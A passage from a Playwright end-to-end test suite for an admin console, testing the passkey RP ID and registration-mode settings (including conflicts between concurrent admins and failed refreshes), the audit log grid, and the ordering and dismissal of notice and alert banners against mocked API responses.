        await expect.poll(() => mock.count("PUT /settings/webauthn")).toBeGreaterThan(0);
        await expect(card.getByText(A("fieldErrors.rp_id.invalid"))).toBeVisible();
        await expect(card.getByText(errText(lang, "fields.invalid"), {exact: true})).toHaveCount(0);
        await expect(field).toHaveAttribute("aria-invalid", "true");
      });

      test("passkey: Retry of a failed save does not outlive the RP ID it was for, and no value is written without its count (wp10-r3-6)", async ({page, context, baseURL}) => {
        const mock = await openAdmin(context, baseURL, {
          handlers: {
            ...rest,
            "GET /settings/registration": reg("invite"),
            "GET /settings/webauthn/impact": (c) => ({body: {credentials: c.query.get("rp_id") === "example.ir" ? 4 : 7, users: 3, enforced_users: 1}}),
            "PUT /settings/webauthn": err(503, "service_unavailable"),
          },
        });
        await goto(page, "/settings", A("pages.settings.title"));
        const card = page.getByTestId("settings-webauthn");
        const field = card.locator('input[name="rp_id"]');
        const save = card.getByRole("button", {name: A("settings.webauthn.submit")});
        await field.fill("example.ir");
        await expect(card.getByTestId("impact-credentials")).toContainText(lang === "fa" ? "۴" : "4");
        await save.click();
        await expect.poll(() => mock.count("PUT /settings/webauthn")).toBe(1);
        const retry = card.getByRole("button", {name: C("retry")});
        await expect(retry).toBeVisible();
        // The admin sees a typo and edits the name: the failure belonged to the old value, so it and its Retry are gone, and
        // the new value waits for its own count.
        await field.fill("examples.ir");
        await expect(retry).toHaveCount(0);
        await expect(card.getByText(errText(lang, "service_unavailable"))).toHaveCount(0);
        await expect(card.getByTestId("impact-credentials")).toContainText(lang === "fa" ? "۷" : "7");
        expect(mock.count("PUT /settings/webauthn")).toBe(1);
      });

      test("passkey: an emptied RP ID says it is required, not that the passkeys are being counted (wp10-r4-1)", async ({page, context, baseURL}) => {
        const mock = await openAdmin(context, baseURL, {handlers: {...rest, "GET /settings/registration": reg("invite"), "GET /settings/webauthn/impact": {body: {credentials: 4, users: 3, enforced_users: 1}}}});
        await goto(page, "/settings", A("pages.settings.title"));
        const card = page.getByTestId("settings-webauthn");
        const field = card.locator('input[name="rp_id"]');
        const save = card.getByRole("button", {name: A("settings.webauthn.submit")});
        await field.fill("");
        await expect(card.getByText(A("settings.webauthn.rpRequired"))).toBeVisible();
        await expect(field).toHaveAttribute("aria-invalid", "true");
        await expect(card.getByText(A("settings.impactLoading"))).toHaveCount(0);
        await expect(card.getByTestId("webauthn-impact")).toHaveCount(0);
        await expect(save).toBeDisabled();
        // Enter in the field answers too, and writes nothing.
        await field.press("Enter");
        await expect(card.getByText(A("settings.webauthn.rpRequired"))).toBeVisible();
        expect(mock.count("PUT /settings/webauthn")).toBe(0);
        // A name again: the message goes and the count comes.
        await field.fill("example.ir");
        await expect(card.getByText(A("settings.webauthn.rpRequired"))).toHaveCount(0);
        await expect(card.getByTestId("impact-credentials")).toBeVisible();
      });

      test("registration: a count that failed to refresh is not a count the admin can confirm on (wp10-r4-2)", async ({page, context, baseURL}) => {
        let up = true;
        await openAdmin(context, baseURL, {
          handlers: {...rest, "GET /settings/registration": reg("invite"), "GET /settings/registration/impact": () => (up ? {body: {graced: 2, suspended_at_once: 1}} : err(503, "service_unavailable"))},
        });
        await goto(page, "/settings", A("pages.settings.title"));
        await page.getByRole("radio", {name: A("settings.registration.mode.closed")}).click();
        const impact = page.getByTestId("registration-impact");
        const confirm = page.getByRole("button", {name: A("settings.registration.confirm", {mode: A("settings.registration.mode.closed")})});
        await expect(impact.getByTestId("impact-graced")).toBeVisible();
        await expect(confirm).toBeEnabled();
        // The count is asked again (the network came back) and that ask fails: TanStack keeps the old numbers, the page does not.
        up = false;
        await page.evaluate(() => {
          window.dispatchEvent(new Event("offline"));
          window.dispatchEvent(new Event("online"));
        });
        await expect(impact).toContainText(A("settings.impactFailed"), {timeout: 20_000});
        await expect(impact.getByTestId("impact-graced")).toHaveCount(0);
        await expect(confirm).toBeDisabled();
      });

      test("registration: a mode another admin changed after this one picked theirs is a conflict that Confirm waits on (wp10-r5-3)", async ({page, context, baseURL}) => {
        await page.clock.install();
        let mode = "invite";
        const mock = await openAdmin(context, baseURL, {
          handlers: {
            ...rest,
            "GET /settings/registration": () => reg(mode),
            "GET /settings/registration/impact": {body: {graced: 2, suspended_at_once: 1}},
            "PUT /settings/registration": {body: {mode: "open", open_grace_days: 7, takeover_idle_days: 30}},
          },
        });
        await goto(page, "/settings", A("pages.settings.title"));
        await page.getByRole("radio", {name: A("settings.registration.mode.open")}).click();
        const confirm = page.getByRole("button", {name: A("settings.registration.confirm", {mode: A("settings.registration.mode.open")})});
        await expect(page.getByTestId("impact-graced")).toBeVisible();
        await expect(confirm).toBeEnabled();
        // Another admin closes registration during an incident. Confirming "open" would undo it.
        mode = "closed";
        await page.clock.fastForward(31_000);
        await page.evaluate(() => {
          window.dispatchEvent(new Event("offline"));
          window.dispatchEvent(new Event("online"));
        });
        const note = page.getByTestId("conflict-mode");
        await expect(note).toBeVisible();
        await expect(note.getByTestId("conflict-mode-value")).toHaveText(A("settings.registration.mode.closed"));
        await expect(confirm).toBeDisabled();
        await note.getByRole("button", {name: A("conflict.keep")}).click();
        await expect(note).toHaveCount(0);
        await expect(confirm).toBeEnabled();
        await confirm.click();
        await expect.poll(() => mock.count("PUT /settings/registration")).toBe(1);
      });

      test("passkey: a count that failed to refresh keeps Save off (wp10-r4-2)", async ({page, context, baseURL}) => {
        let up = true;
        const mock = await openAdmin(context, baseURL, {
          handlers: {
            ...rest,
            "GET /settings/registration": reg("invite"),
            "GET /settings/webauthn/impact": () => (up ? {body: {credentials: 4, users: 3, enforced_users: 1}} : err(503, "service_unavailable")),
          },
        });
        await goto(page, "/settings", A("pages.settings.title"));
        const card = page.getByTestId("settings-webauthn");
        const save = card.getByRole("button", {name: A("settings.webauthn.submit")});
        await card.locator('input[name="rp_id"]').fill("example.ir");
        await expect(card.getByTestId("impact-credentials")).toBeVisible();
        await expect(save).toBeEnabled();
        up = false;
        await page.evaluate(() => {
          window.dispatchEvent(new Event("offline"));
          window.dispatchEvent(new Event("online"));
        });
        await expect(card.getByTestId("impact-failed")).toBeVisible({timeout: 20_000});
        await expect(card.getByTestId("impact-credentials")).toHaveCount(0);
        await expect(save).toBeDisabled();
        // Enter does not get around the button.
        await card.locator('input[name="rp_id"]').press("Enter");
        expect(mock.count("PUT /settings/webauthn")).toBe(0);
      });

      // wp10-r11-3. The Settings cards under a failed background refetch of their own query.
      test("passkey: a failed background refetch keeps the typed RP ID and shows the line (wp10-r11-3)", async ({page, context, baseURL}) => {
        await page.clock.install();
        let up = true;
        const server = {rp_id: "panel.example.ir", allowed_origins: ["https://panel.example.ir"], enabled: false};
        const mock = await openAdmin(context, baseURL, {
          handlers: {
            ...rest,
            "GET /settings/webauthn": () => (up ? {body: server} : err(503, "service_unavailable")),
            "GET /settings/registration": reg("invite"),
            "GET /settings/webauthn/impact": {body: {credentials: 4, users: 3, enforced_users: 1}},
          },
        });
        await goto(page, "/settings", A("pages.settings.title"));
        const card = page.getByTestId("settings-webauthn");
        const rp = card.locator('input[name="rp_id"]');
        await rp.fill("example.ir");
        await expect(card.getByTestId("impact-credentials")).toBeVisible();
        up = false;
        await reconnect(page);
        await expect(card.getByTestId("refresh-failed")).toBeVisible({timeout: 20_000});
        await expect(card.getByTestId("refresh-failed")).toHaveAttribute("role", "alert");
        await expect(rp).toHaveValue("example.ir");
        up = true;
        await card.getByTestId("refresh-failed").getByRole("button", {name: C("retry")}).click();
        await expect(card.getByTestId("refresh-failed")).toHaveCount(0);
        await expect(rp).toHaveValue("example.ir");
        expect(mock.count("PUT /settings/webauthn")).toBe(0);
      });

      test("registration: a failed background refetch keeps the picked mode and its draft, with the line (wp10-r11-3)", async ({page, context, baseURL}) => {
        await page.clock.install();
        let up = true;
        const mock = await openAdmin(context, baseURL, {
          handlers: {
            ...rest,
            "GET /settings/registration": () => (up ? reg("invite") : err(503, "service_unavailable")),
            "GET /settings/registration/impact": {body: {graced: 2, suspended_at_once: 1}},
          },
        });
        await goto(page, "/settings", A("pages.settings.title"));
        await page.getByRole("radio", {name: A("settings.registration.mode.closed")}).click();
        const card = page.getByTestId("settings-registration");
        await expect(card.getByTestId("registration-draft")).toBeVisible();
        up = false;
        await reconnect(page);
        await expect(card.getByTestId("refresh-failed")).toBeVisible({timeout: 20_000});
        await expect(card.getByTestId("refresh-failed")).toHaveAttribute("role", "alert");
        await expect(card.getByTestId("registration-draft")).toBeVisible();
        await expect(page.getByRole("radio", {name: A("settings.registration.mode.closed")})).toBeChecked();
        up = true;
        await card.getByTestId("refresh-failed").getByRole("button", {name: C("retry")}).click();
        await expect(card.getByTestId("refresh-failed")).toHaveCount(0);
        await expect(card.getByTestId("registration-draft")).toBeVisible();
        expect(mock.count("PUT /settings/registration")).toBe(0);
      });

      test("passkey: the switch the admin did not touch is what the server holds when they save (wp10-r4-3)", async ({page, context, baseURL}) => {
        // A types a new RP ID; B turns Passkey off during an incident. A's write must not turn it back on.
        await page.clock.install();
        let server = {rp_id: "panel.example.ir", allowed_origins: ["https://panel.example.ir"], enabled: true};
        const mock = await openAdmin(context, baseURL, {
          handlers: {
            ...rest,
            "GET /settings/webauthn": () => ({body: server}),
            "GET /settings/registration": reg("invite"),
            "GET /settings/webauthn/impact": {body: {credentials: 4, users: 3, enforced_users: 1}},
            "PUT /settings/webauthn": (c) => ({body: {...server, ...(c.body as object)}}),
          },
        });
        await goto(page, "/settings", A("pages.settings.title"));
        const card = page.getByTestId("settings-webauthn");
        const sw = card.getByRole("switch", {name: A("settings.webauthn.enabled")});
        await card.locator('input[name="rp_id"]').fill("example.ir");
        await expect(card.getByTestId("impact-credentials")).toBeVisible();
        await expect(sw).toBeChecked();
        server = {...server, enabled: false};
        await page.clock.fastForward(31_000);
        await page.evaluate(() => {
          window.dispatchEvent(new Event("offline"));
          window.dispatchEvent(new Event("online"));
        });
        await expect(sw).not.toBeChecked();
        await card.getByRole("button", {name: A("settings.webauthn.submit")}).click();
        await expect.poll(() => bodies(mock, "PUT", "/settings/webauthn")).toEqual([{rp_id: "example.ir", enabled: false}]);
      });

      test("passkey: an RP ID the admin typed and another admin changed is a conflict that Save waits on (wp10-r5-3)", async ({page, context, baseURL}) => {
        await page.clock.install();
        let server = {rp_id: "panel.example.ir", allowed_origins: ["https://panel.example.ir"], enabled: true};
        const mock = await openAdmin(context, baseURL, {
          handlers: {
            ...rest,
            "GET /settings/webauthn": () => ({body: server}),
            "GET /settings/registration": reg("invite"),
            "GET /settings/webauthn/impact": {body: {credentials: 4, users: 3, enforced_users: 1}},
            "PUT /settings/webauthn": (c) => ({body: {...server, ...(c.body as object)}}),
          },
        });
        await goto(page, "/settings", A("pages.settings.title"));
        const card = page.getByTestId("settings-webauthn");
        const rp = card.locator('input[name="rp_id"]');
        const save = card.getByRole("button", {name: A("settings.webauthn.submit")});
        await rp.fill("example.ir");
        await expect(card.getByTestId("impact-credentials")).toBeVisible();
        await expect(save).toBeEnabled();
        server = {...server, rp_id: "other.example.ir"};
        await page.clock.fastForward(31_000);
        await page.evaluate(() => {
          window.dispatchEvent(new Event("offline"));
          window.dispatchEvent(new Event("online"));
        });
        const note = card.getByTestId("conflict-rp_id");
        await expect(note).toBeVisible();
        await expect(note.getByTestId("conflict-rp_id-value")).toHaveText("other.example.ir");
        await expect(rp).toHaveValue("example.ir");
        await expect(save).toBeDisabled();
        await rp.press("Enter");
        expect(mock.count("PUT /settings/webauthn")).toBe(0);
        await note.getByRole("button", {name: A("conflict.keep")}).click();
        await expect(note).toHaveCount(0);
        await expect(card.getByTestId("impact-credentials")).toBeVisible();
        await expect(save).toBeEnabled();
        await save.click();
        await expect.poll(() => bodies(mock, "PUT", "/settings/webauthn")).toEqual([{rp_id: "example.ir", enabled: true}]);
      });

      test("registration: the grace days another admin changed are a conflict at Confirm, and Keep my value then sends the admin's (wp10-r6-1)", async ({page, context, baseURL}) => {
        let grace = 0;
        const mock = await openAdmin(context, baseURL, {
          handlers: {
            ...rest,
            "GET /settings/registration": () => reg("invite", grace),
            "GET /settings/registration/impact": {body: {graced: 2, suspended_at_once: 1}},
            "PUT /settings/registration": {body: {mode: "open", open_grace_days: 7, takeover_idle_days: 30}},
          },
        });
        await goto(page, "/settings", A("pages.settings.title"));
        await page.getByRole("radio", {name: A("settings.registration.mode.open")}).click();
        const confirm = page.getByRole("button", {name: A("settings.registration.confirm", {mode: A("settings.registration.mode.open")})});
        const days = page.locator('input[name="open_grace_days"]');
        await days.fill("7");
        await days.blur();
        await expect(page.getByTestId("impact-graced")).toBeVisible();
        await expect(confirm).toBeEnabled();
        // Another admin sets the grace length. The mode is still the one this admin saw, so only the days conflict.
        grace = 14;
        await confirm.click();
        const note = page.getByTestId("conflict-open_grace_days");
        await expect(note.getByTestId("conflict-open_grace_days-value")).toHaveText(lang === "fa" ? "۱۴" : "14");
        await expect(page.getByTestId("conflict-mode")).toHaveCount(0);
        await expect(days).toHaveValue(lang === "fa" ? "۷" : "7");
        await expect(confirm).toBeDisabled();
        expect(mock.count("PUT /settings/registration")).toBe(0);
        await note.getByRole("button", {name: A("conflict.keep")}).click();
        await expect(confirm).toBeEnabled();
        await confirm.click();
        await expect.poll(() => bodies(mock, "PUT", "/settings/registration")).toEqual([{mode: "open", open_grace_days: 7}]);
      });

      test("registration: a mode another admin set to the very one picked leaves nothing pending (wp10-r6-3)", async ({page, context, baseURL}) => {
        // A picks "closed" during an incident and B closes registration first. A Confirm now would ask for a fresh code and write an
        // audit row for a change that has already happened.
        await page.clock.install();
        let mode = "invite";
        const mock = await openAdmin(context, baseURL, {
          handlers: {...rest, "GET /settings/registration": () => reg(mode), "GET /settings/registration/impact": {body: {graced: 2, suspended_at_once: 1}}},
        });
        await goto(page, "/settings", A("pages.settings.title"));
        await page.getByRole("radio", {name: A("settings.registration.mode.closed")}).click();
        await expect(page.getByTestId("registration-draft")).toBeVisible();
        mode = "closed";
        await page.clock.fastForward(31_000);
        await page.evaluate(() => {
          window.dispatchEvent(new Event("offline"));
          window.dispatchEvent(new Event("online"));
        });
        await expect(page.getByTestId("registration-draft")).toHaveCount(0);
        await expect(page.getByTestId("conflict-mode")).toHaveCount(0);
        await expect(page.getByRole("radio", {name: A("settings.registration.mode.closed")})).toBeChecked();
        expect(mock.count("PUT /settings/registration")).toBe(0);
      });

      test("passkey: the server is read again after the fresh-code dialog, and a switch turned off meanwhile is not turned back on (wp10-r7-5)", async ({page, context, baseURL}) => {
        let server = {rp_id: "panel.example.ir", allowed_origins: ["https://panel.example.ir"], enabled: true};
        let puts = 0;
        const mock = await openAdmin(context, baseURL, {
          handlers: {
            ...rest,
            "GET /settings/webauthn": () => ({body: server}),
            "GET /settings/registration": reg("invite"),
            "GET /settings/webauthn/impact": {body: {credentials: 4, users: 3, enforced_users: 1}},
            "PUT /settings/webauthn": (c) => (++puts === 1 ? err(403, "totp_fresh_required") : {body: {...server, ...(c.body as object)}}),
            "POST /auth/totp/fresh": FRESH,
          },
        });
        await goto(page, "/settings", A("pages.settings.title"));
        const card = page.getByTestId("settings-webauthn");
        const sw = card.getByRole("switch", {name: A("settings.webauthn.enabled")});
        await card.locator('input[name="rp_id"]').fill("example.ir");
        await expect(card.getByTestId("impact-credentials")).toBeVisible();
        await card.getByRole("button", {name: A("settings.webauthn.submit")}).click();
        await expect(page.getByRole("dialog", {name: A("fresh.title")})).toBeVisible();
        // Another admin turns Passkey off during an incident while this one looks for the phone.
        server = {...server, enabled: false};
        await typeCode(page, "totp_code", CODE);
        await expect(page.getByText(A("conflict.refreshed"))).toBeVisible();
        expect(mock.count("PUT /settings/webauthn")).toBe(1);
        await expect(sw).not.toBeChecked();
      });

      test("passkey: Save reads the server first, so a switch turned off meanwhile is not turned back on, with no refocus or reconnect (wp10-r6-5)", async ({page, context, baseURL}) => {
        let server = {rp_id: "panel.example.ir", allowed_origins: ["https://panel.example.ir"], enabled: true};
        const mock = await openAdmin(context, baseURL, {
          handlers: {
            ...rest,
            "GET /settings/webauthn": () => ({body: server}),
            "GET /settings/registration": reg("invite"),
            "GET /settings/webauthn/impact": {body: {credentials: 4, users: 3, enforced_users: 1}},
            "PUT /settings/webauthn": (c) => ({body: {...server, ...(c.body as object)}}),
          },
        });
        await goto(page, "/settings", A("pages.settings.title"));
        const card = page.getByTestId("settings-webauthn");
        const sw = card.getByRole("switch", {name: A("settings.webauthn.enabled")});
        const save = card.getByRole("button", {name: A("settings.webauthn.submit")});
        await card.locator('input[name="rp_id"]').fill("example.ir");
        await expect(card.getByTestId("impact-credentials")).toBeVisible();
        await expect(sw).toBeChecked();
        server = {...server, enabled: false};
        await save.click();
        await expect(page.getByText(A("conflict.refreshed"))).toBeVisible();
        await expect(sw).not.toBeChecked();
        expect(mock.count("PUT /settings/webauthn")).toBe(0);
        await save.click();
        await expect.poll(() => bodies(mock, "PUT", "/settings/webauthn")).toEqual([{rp_id: "example.ir", enabled: false}]);
      });

      test("passkey: the origins are read only, a changed RP ID shows its impact, and the save is one write", async ({page, context, baseURL}) => {
        const mock = await openAdmin(context, baseURL, {
          handlers: {...rest, "GET /settings/registration": reg("invite"), "GET /settings/webauthn/impact": {body: {credentials: 4, users: 3, enforced_users: 1}}, "PUT /settings/webauthn": {body: {rp_id: "example.ir", allowed_origins: ["https://panel.example.ir"], enabled: false}}},
        });
        await goto(page, "/settings", A("pages.settings.title"));
        const card = page.getByTestId("settings-webauthn");
        await expect(card.getByTestId("webauthn-origins")).toContainText("https://panel.example.ir");
        // The origins are text, not a field.
        await expect(card.locator('input[value="https://panel.example.ir"]')).toHaveCount(0);
        await card.locator('input[name="rp_id"]').fill("example.ir");
        await expect(card.getByTestId("webauthn-impact")).toContainText(lang === "fa" ? "۴" : "4");
        await card.getByRole("button", {name: A("settings.webauthn.submit")}).click();
        await expect.poll(() => bodies(mock, "PUT", "/settings/webauthn")).toEqual([{rp_id: "example.ir", enabled: false}]);
        expect(mock.calls.some((c) => c.path === "/settings/webauthn/impact" && c.query.get("rp_id") === "example.ir")).toBe(true);
      });

      test("passkey: an RP ID in other capitals is the same RP ID, as the server reads it (wp10-r2-5)", async ({page, context, baseURL}) => {
        const mock = await openAdmin(context, baseURL, {
          handlers: {...rest, "GET /settings/registration": reg("invite"), "GET /settings/webauthn/impact": {body: {credentials: 4, users: 3, enforced_users: 1}}, "PUT /settings/webauthn": {body: {rp_id: "example.ir", allowed_origins: ["https://panel.example.ir"], enabled: false}}},
        });
        await goto(page, "/settings", A("pages.settings.title"));
        const card = page.getByTestId("settings-webauthn");
        const field = card.locator('input[name="rp_id"]');
        await field.fill("  Panel.Example.IR ");
        // Not a change: no count is asked, no warning is shown and Save stays off.
        await expect(card.getByTestId("webauthn-impact")).toHaveCount(0);
        await expect(card.getByRole("button", {name: A("settings.webauthn.submit")})).toBeDisabled();
        expect(mock.calls.some((c) => c.path === "/settings/webauthn/impact")).toBe(false);
        // A real change typed in capitals is sent in the form the server stores.
        await field.fill("Example.IR");
        await expect(card.getByTestId("webauthn-impact")).toContainText(lang === "fa" ? "۴" : "4");
        await card.getByRole("button", {name: A("settings.webauthn.submit")}).click();
        await expect.poll(() => bodies(mock, "PUT", "/settings/webauthn")).toEqual([{rp_id: "example.ir", enabled: false}]);
      });

      test("passkey: turning it on in production is refused by the server and the page says so plainly", async ({page, context, baseURL}) => {
        await openAdmin(context, baseURL, {handlers: {...rest, "GET /settings/registration": reg("invite"), "PUT /settings/webauthn": err(422, "validation_failed")}});
        await goto(page, "/settings", A("pages.settings.title"));
        const card = page.getByTestId("settings-webauthn");
        await card.getByRole("switch", {name: A("settings.webauthn.enabled")}).locator("xpath=ancestor::label").click();
        await card.getByRole("button", {name: A("settings.webauthn.submit")}).click();
        await expect(card.getByText(errText(lang, "validation_failed"))).toBeVisible();
        await expect(card.getByTestId("webauthn-refused")).toContainText(A("settings.webauthn.refused"));
      });
    });

    // ---- Audit ----------------------------------------------------------------------------------------------------

    test.describe("audit", () => {
      test("rows with the action, target and params as one technical block, never HTML", async ({page, context, baseURL}) => {
        await openAdmin(context, baseURL, {
          handlers: {"GET /audit": {body: {items: [auditFixture({id: 2, action: "sms.gateway_put", target: "sms_ir", params: {fields: ["credentials"], note: "<b>bold</b>"}}), auditFixture({id: 1})]}}},
        });
        await goto(page, "/audit", A("pages.audit.title"));
        const grid = page.getByRole("grid", {name: A("audit.gridLabel")});
        await expect(grid.getByRole("row")).toHaveCount(3);
        const row = grid.getByRole("row").nth(1);
        await expect(row.locator('bdi[dir="ltr"]').first()).toBeVisible();
        await expect(row).toContainText("fields=credentials");
        // The text is shown as text.
        await expect(row).toContainText("<b>bold</b>");
        await expect(row.locator("b")).toHaveCount(0);
      });

      test("the filter sends an exact action after a pause, and a malformed name is not sent", async ({page, context, baseURL}) => {
        const mock = await openAdmin(context, baseURL, {handlers: {"GET /audit": (c) => ({body: {items: c.query.get("action") ? [] : [auditFixture()]}})}});
        await goto(page, "/audit", A("pages.audit.title"));
        const field = page.locator('input[name="action"]');
        await field.fill("Not A Name");
        await expect(field).toHaveAttribute("aria-invalid", "true");
        await page.waitForTimeout(700);
        expect(mock.calls.some((c) => c.path === "/audit" && c.query.get("action"))).toBe(false);
        await field.fill("admin.login");
        await expect(page.getByTestId("grid-empty")).toContainText(A("audit.empty.filterTitle"));
        expect(mock.calls.some((c) => c.path === "/audit" && c.query.get("action") === "admin.login")).toBe(true);
      });

      test("an invalid filter does not leave the rows of the last valid one on the grid (wp10-r7-4)", async ({page, context, baseURL}) => {
        await openAdmin(context, baseURL, {
          handlers: {"GET /audit": (c) => ({body: {items: [auditFixture(c.query.get("action") ? {id: 5, action: "user.create"} : {id: 1, action: "admin.login"})]}})},
        });
        await goto(page, "/audit", A("pages.audit.title"));
        const grid = page.getByRole("grid", {name: A("audit.gridLabel")});
        const field = page.locator('input[name="action"]');
        await field.fill("user.create");
        await expect(grid.getByRole("row")).toHaveCount(2);
        await expect(grid).toContainText("user.create");
        // The box now holds text that is not an action name: nothing is filtered by it, so nothing of the old filter may stay on show.
        await field.fill("User.Create");
        await expect(field).toHaveAttribute("aria-invalid", "true");
        await expect(grid).toHaveCount(0);
        await expect(page.getByTestId("grid-empty")).toContainText(A("audit.filter.invalid"));
        // A valid name brings its rows back.
        await field.fill("user.create");
        await expect(page.getByRole("grid", {name: A("audit.gridLabel")}).getByRole("row")).toHaveCount(2);
      });

      test("the Admin column shows the name, the id alone for a deleted admin and a dash for no admin, and the next page loads by next_cursor", async ({page, context, baseURL}) => {
        const DELETED = "00000000-0000-4000-8000-0000000000dd";
        const first = Array.from({length: 50}, (_, i) =>
          auditFixture({id: 200 - i, action: "admin.login", admin_id: "00000000-0000-4000-8000-0000000000aa", ...(i === 1 ? {admin_name: undefined, admin_id: DELETED} : i === 2 ? {admin_name: undefined, admin_id: undefined} : {admin_name: "root"})}),
        );
        const second = Array.from({length: 5}, (_, i) => auditFixture({id: 100 - i, action: "user.create", admin_id: "00000000-0000-4000-8000-0000000000aa", admin_name: "second.page"}));
        const mock = await openAdmin(context, baseURL, {
          handlers: {"GET /audit": (call) => (call.query.get("cursor") === "next-page" ? {body: {items: second}} : {body: {items: first, next_cursor: "next-page"}})},
        });
        await goto(page, "/audit", A("pages.audit.title"));
        const grid = page.getByRole("grid", {name: A("audit.gridLabel")});
        await expect(grid.getByRole("columnheader", {name: A("audit.columns.admin")})).toBeVisible();
        await expect(grid.getByRole("row").nth(1)).toBeVisible();
        await expect(grid.getByTestId("audit-admin-name").first()).toHaveText("root");
        // A deleted admin leaves the row with the id and nothing else.
        await expect(grid.getByTestId("audit-admin-id")).toHaveText(DELETED);
        // A row with no admin at all (the third) shows a dash in that cell, and no other cell of that fixture is empty.
        await expect(grid.getByRole("row").nth(3)).toContainText("—");
        // The next page is asked by its cursor, with the same page size and no filter, and its rows join the first page's.
        await grid.hover();
        for (let i = 0; i < 40 && mock.calls.filter((c) => c.path === "/audit" && c.query.get("cursor") === "next-page").length < 1; i++) await page.mouse.wheel(0, 1500);
        await expect.poll(() => mock.calls.filter((c) => c.path === "/audit" && c.query.get("cursor") === "next-page").length).toBeGreaterThanOrEqual(1);
        const more = mock.calls.find((c) => c.path === "/audit" && c.query.get("cursor") === "next-page")!;
        expect(more.query.get("limit")).toBe("50");
        expect(more.query.get("action")).toBeNull();
        await expect.poll(async () => {
          await grid.hover();
          await page.mouse.wheel(0, 3000);
          return grid.getByText("second.page").count();
        }).toBeGreaterThan(0);
        // The first page is still there: a page appends, it does not replace.
        await expect(grid.getByTestId("audit-admin-id")).toHaveText(DELETED);
        // A filter starts again from the first page, with no cursor.
        await page.locator('input[name="action"]').fill("user.create");
        await expect.poll(() => mock.calls.some((c) => c.path === "/audit" && c.query.get("action") === "user.create" && c.query.get("cursor") === null)).toBe(true);
      });

    });

    // ---- Banners --------------------------------------------------------------------------------------------------

    test.describe("banners", () => {
      test("notices of a console reset show with their time, and dismissing one acknowledges them", async ({page, context, baseURL}) => {
        const mock = await openAdmin(context, baseURL, {me: {notices: [{kind: "password_reset", at: "2026-11-16T08:00:00Z"}]}});
        await goto(page, "/users", A("pages.users.title"));
        const stack = page.getByRole("region", {name: shellText(lang, "banners.region")});
        await expect(stack).toContainText(A("notices.password_reset.title"));
        await stack.getByRole("button", {name: shellText(lang, "banners.dismiss")}).click();
        await expect.poll(() => mock.count("POST /me/notices/ack")).toBe(1);
        await expect(stack).toHaveCount(0);
      });

      test("alerts come with the notices, critical first, and two show before 'more'", async ({page, context, baseURL}) => {
        await openAdmin(context, baseURL, {
          me: {notices: [{kind: "totp_reset", at: "2026-11-16T08:00:00Z"}]},
          alerts: [
            alertFixture({id: "40000000-0000-4000-8000-0000000000a1", severity: "warning", kind: "sms_outbox_cap", params: {}}),
            alertFixture({id: "40000000-0000-4000-8000-0000000000a2", severity: "critical", kind: "sms_down", params: {}}),
          ],
        });
        await goto(page, "/users", A("pages.users.title"));
        const stack = page.getByRole("region", {name: shellText(lang, "banners.region")});
        const items = stack.locator(".banner-stack__item");
        await expect(items).toHaveCount(2);
        // The critical alert is first (13.6), then the notice, and the warning alert is behind the button.
        await expect(items.first()).toContainText(A("alerts.sms_down.title"));
        await expect(items.nth(1)).toContainText(A("notices.totp_reset.title"));
        // A third banner is behind a button that says how many more there are.
        await expect(stack.getByRole("button", {name: lang === "fa" ? /اعلان دیگر/ : /more notice/})).toHaveCount(1);
      });

      test("a critical alert is never behind notices: two notices and a critical alert show the alert first", async ({page, context, baseURL}) => {
        await openAdmin(context, baseURL, {
          me: {notices: [{kind: "sms_gateway_changed", at: "2026-11-16T09:00:00Z"}, {kind: "totp_reset", at: "2026-11-16T08:00:00Z"}]},
          alerts: [alertFixture({id: "40000000-0000-4000-8000-0000000000a3", severity: "critical", kind: "sms_down", params: {}})],
        });
        await goto(page, "/users", A("pages.users.title"));
        const items = page.getByRole("region", {name: shellText(lang, "banners.region")}).locator(".banner-stack__item");
        await expect(items).toHaveCount(2);
        await expect(items.first()).toContainText(A("alerts.sms_down.title"));
        await expect(items.nth(1)).toContainText(A("notices.sms_gateway_changed.title"));
      });

      test("dismissing a notice acknowledges only when the last one is closed, so none is erased unseen", async ({page, context, baseURL}) => {
        const mock = await openAdmin(context, baseURL, {
          me: {notices: [{kind: "sms_gateway_changed", at: "2026-11-16T09:00:00Z"}, {kind: "totp_reset", at: "2026-11-16T08:00:00Z"}, {kind: "password_reset", at: "2026-11-16T07:00:00Z"}]},
        });
        await goto(page, "/users", A("pages.users.title"));
        const stack = page.getByRole("region", {name: shellText(lang, "banners.region")});
        const dismiss = () => stack.getByRole("button", {name: shellText(lang, "banners.dismiss")}).first().click();
        await expect(stack.locator(".banner-stack__item")).toHaveCount(2);
        // wp10-r1-6: two of three are closed and the third was behind the button: nothing is acknowledged yet.
        await dismiss();
        await expect(stack.locator(".banner-stack__item")).toHaveCount(2);
        await dismiss();
        await expect(stack.locator(".banner-stack__item")).toHaveCount(1);
        await expect(stack.locator(".banner-stack__item")).toContainText(A("notices.password_reset.title"));
        expect(mock.count("POST /me/notices/ack")).toBe(0);
        await dismiss();
        await expect.poll(() => mock.count("POST /me/notices/ack")).toBe(1);
        await expect(stack).toHaveCount(0);
      });

      test("an alert of a kind this page does not know gets the generic words", async ({page, context, baseURL}) => {
        await openAdmin(context, baseURL, {alerts: [alertFixture({kind: "other", severity: "info", params: {}})]});
        await goto(page, "/users", A("pages.users.title"));
        await expect(page.getByText(A("alerts.generic.title"))).toBeVisible();
      });

      test("dismissing an alert acknowledges that alert", async ({page, context, baseURL}) => {
        const mock = await openAdmin(context, baseURL, {
          alerts: [alertFixture({id: "40000000-0000-4000-8000-0000000000b1", severity: "critical", kind: "sms_down", params: {}})],
          handlers: {"POST /alerts/{id}/ack": {status: 204}},
        });
        await goto(page, "/users", A("pages.users.title"));
        mock.alerts.current = [];
        await page.getByRole("button", {name: shellText(lang, "banners.dismiss")}).click();
        await expect.poll(() => mock.calls.filter((c) => c.path === "/alerts/40000000-0000-4000-8000-0000000000b1/ack").length).toBe(1);
        // The banner is gone with the acknowledgement, not only the call made.
        await expect(page.getByRole("region", {name: shellText(lang, "banners.region")})).toHaveCount(0);
      });

      // wp10-r14-2. A failed acknowledgement from the banner is said, not swallowed: the banner stays, and the failure is read.
      test("a failed alert dismissal keeps the banner and says why", async ({page, context, baseURL}) => {
        const mock = await openAdmin(context, baseURL, {
          alerts: [alertFixture({id: "40000000-0000-4000-8000-0000000000b2", severity: "critical", kind: "sms_down", params: {}})],
          handlers: {"POST /alerts/{id}/ack": err(503, "service_unavailable")},
        });
        await goto(page, "/users", A("pages.users.title"));
        const stack = page.getByRole("region", {name: shellText(lang, "banners.region")});
        await stack.getByRole("button", {name: shellText(lang, "banners.dismiss")}).click();
